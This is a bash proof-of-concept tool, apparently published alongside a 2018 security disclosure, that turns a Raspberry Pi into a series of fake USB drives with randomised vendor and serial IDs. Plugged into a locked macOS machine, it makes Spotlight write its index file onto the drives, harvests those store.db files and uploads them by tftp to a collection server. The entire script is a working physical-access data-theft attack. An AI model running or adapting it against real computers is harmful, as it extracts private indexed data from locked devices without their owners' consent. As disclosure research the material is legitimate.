#!/bin/bash
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <https://www.gnu.org/licenses/>.

# spotPlight automates the process of reading data indexed by Spotlight from a locked macOS device.
#
# author: Jeff Yestrumskas
# version: 1.0
#
# https://fyrmassociates.com/blog/2018/12/01/macos-spotlight-data-leak/

# ramdisk info:
# ram0 = temporary storage
# ram1-8 = disks presented to target

# an ext4 partition will be created here
# this is used for temporary storage to avoid torching the sd card

DISKTMP=/dev/ram0
PARTTMP=/dev/ram0p1
MNTTMP=/mnt/ram0
SHALIST=/mnt/ram0/shalist.txt

# seed setup, SEEDPATH are the initial files for the filesystem
SEEDPATH=/home/pi/seedfs/
SEEDDISK=/dev/ram15
SEEDMNT=/mnt/ram15

# total number of ram disks to use, starting with 1, ending with this value
MAXDISKS=3

# total number of partitions per ram disk to use
MAXPARTS=3

# spotlight index file to pull from the faux usb drive
TARGET=.store.db
TARGET2=store.db

# seconds to wait before removing the faux drive
SLEEP=10

# set this to 1 if you wish to supply fake device vendor information
CHANGEDEV=1

# set to 0 to disable sending files to a tftp server
USETFTP=1
TFTPSERVER=192.168.0.1
TFTPPORT=69

# set to 1 to keep a copy of the files on the local device
STORELOCAL=0

# dump results here if STORELOCAL set to 1
COLLECT=/home/pi/sl

# max number of times to run
MAXITER=1000

# write to this file to display stats on a pioled
PISTATS=$MNTTMP/piout.log

# set to 1 to print messages to stdout
PRSTDOUT=1

# temporary storage setup and handling
if [ ! -d "$MNTTMP" ]; then
	mkdir $MNTTMP
else
	umount $MNTTMP > /dev/null 2>&1
fi

# create our scratch partition
dd if=/dev/zero of=$PARTTMP bs=4096 count=1 > /dev/null 2>&1
echo -e "n\np\n1\n\n\nw" | fdisk $DISKTMP > /dev/null 2>&1
mkfs $PARTTMP > /dev/null 2>&1

# mount our temp/scratch disk
mount $PARTTMP $MNTTMP > /dev/null 2>&1
touch $SHALIST
touch $PISTATS
# end temporary storage setup and handling

function d {
	if [ $PISTATS ]
	then
		echo "`date +%H%M%S` $1" >> $PISTATS
	fi
}

function o {
	if [ $PRSTDOUT == 1 ]
	then
		echo "`date +%Y%m%d%H%M%S` $1"
	fi
}

for i in `ps axuw | grep applestats.py | awk '{print $2}'`; do kill $i; done > /dev/null 2>&1
sudo python /home/pi/applestats.py &

# create a seed ram disk and partitions
d "seed"
o "creating seed ram disk and partitions"
echo -e "n\np\n\n\n+$((1000 + RANDOM %300))K\nn\np\n\n\n+$((1000 + RANDOM %300))K\nn\np\n\n\n+$((1000 + RANDOM %300))K\nt\n1\n7\nt\n2\n7\nt\n3\n7\nw\n" | fdisk $SEEDDISK > /dev/null 2>&1
for i in `seq 1 $MAXPARTS`; do
	mkfs.exfat $SEEDDISK\p$i > /dev/null 2>&1
	mkdir -p $SEEDMNT\p$i > /dev/null 2>&1
	mount $SEEDDISK\p$i $SEEDMNT\p$i > /dev/null 2>&1
	cp -r $SEEDPATH.[^.]* $SEEDMNT\p$i
	umount $SEEDMNT\p$i
done
# end create seed ram disk

# create our presentation ramdisks from the seed disk above
d "seed -> ram"
o "creating ramdisks from seed disk"
for i in `seq 1 $MAXDISKS`; do
	dd if=$SEEDDISK of=/dev/ram$i bs=1024 > /dev/null 2>&1
done
# end create our presentation ramdisks and partitions

# main loop
for i in `seq 1 $MAXITER`; do

	# faux disk preparation loop
	d "prep"
	o "prepping"
	for x in `seq 1 $MAXDISKS`; do
		for y in `seq 1 $MAXPARTS`; do

			o "prepping $x $y"

			PARTRAM=/dev/ram$x\p$y	
			MNTRAM=/mnt/ram$x\p$y

			mkdir -p $MNTRAM

			mount $PARTRAM -t exfat $MNTRAM > /dev/null 2>&1

			rm -f $MNTRAM/*.txt

			# create a few dummy files, this makes sure the faux drive is different each time
			# will force a new .store.db file to be created on each insert
			for z in `seq 1 2`; do
				dd bs=20000 count=1 if=/dev/urandom of=$MNTRAM/`date +%N | md5sum | awk '{print $1}'`.txt > /dev/null 2>&1
			done

			# remove our target file from the seed drive in case it somehow ends up there
			find $MNTRAM -name "$TARGET" -exec rm {} \;
			find $MNTRAM -name "$TARGET2" -exec rm {} \;

			umount $MNTRAM
		done
	done
	# end faux disk preparation loop

	# faux disk presentation loop
	for x in `seq 1 $MAXDISKS`; do
		# set random device vendor information
		ADDITIONALPARMS=""
		if [ $CHANGEDEV == 1 ]
		then
			IDVENDOR=0x$((1000 + RANDOM % 8999))
			IDPRODUCT=0x$((1000 + RANDOM % 8999))
			IMANUFACTURER="`< /dev/urandom tr -dc A-Za-z | head -c${1:-12};echo;`"
			IPRODUCT="`< /dev/urandom tr -dc A-Za-z | head -c${1:-12};echo;`"
			ISERIALNUMBER=$((100000 + RANDOM % 899999))$((100000 + RANDOM % 899999))
			BCDDEVICE=0x$((1000 + RANDOM % 8999))
			ADDITIONALPARMS="idVendor=$IDVENDOR bcdDevice=$BCDDEVICE idProduct=$IDPRODUCT iManufacturer=$IMANUFACTURER iProduct=$IPRODUCT iSerialNumber=$ISERIALNUMBER"
		fi	

		# attach the faux drive
		d "attach"
		o "attaching /dev/ram$x $ADDITIONALPARMS"
		modprobe g_mass_storage file=/dev/ram$x stall=0 $ADDITIONALPARMS

	sleep $SLEEP
	d "detatch"
	o "forcefully removing"
	rmmod g_mass_storage
	done
	# faux drives detached

	d "read"
	o "reading ram disk data"
	# faux drive read loop
	for x in `seq 1 $MAXDISKS`; do
		for y in `seq 1 $MAXPARTS`; do

			PARTRAM=/dev/ram$x\p$y	
			MNTRAM=/mnt/ram$x\p$y

			o "reading $PARTRAM -> $MNTRAM"
			# read and analyze contents of the faux drive
			# we do this in ram to not kill the sd card
			mount $PARTRAM $MNTRAM > /dev/null 2>&1
	
			STOREDB=`find $MNTRAM -name $TARGET`
			if [[ $STOREDB =~ ([a-z]|[A-Z]) ]]
				then
					TMPSHA=`sha1sum $STOREDB | awk '{print $1}' | sort -u`

					if grep -q $TMPSHA $SHALIST
						then
						d "skipping"
						o "skip, $TMPSHA exists"
					else 
						d "new!"
						o "$TMPSHA new, adding"
						TMPFILE="`date +%Y%m%d%H%M%S`-$IDVENDOR-$IDPRODUCT-$IMANUFACTURER-$IPRODUCT-$ISERIALNUMBER-$BCDDEVICE-$TARGET"

						if [ $USETFTP == 1 ]
						then
							o "tftp"
							tftp -v $TFTPSERVER $TFTPPORT -c put $STOREDB $TMPFILE > /dev/null 2>&1
						fi

						if [ $STORELOCAL == 1 ] 
						then
							cp $STOREDB $COLLECT/$TMPFILE
						fi
						echo $TMPSHA >> $SHALIST
					fi
		
				else
					d "no file"
					o "no $TARGET"
			fi

			o "umounting $MNTRAM"
			umount $MNTRAM
		done
	done

done
# end main loop
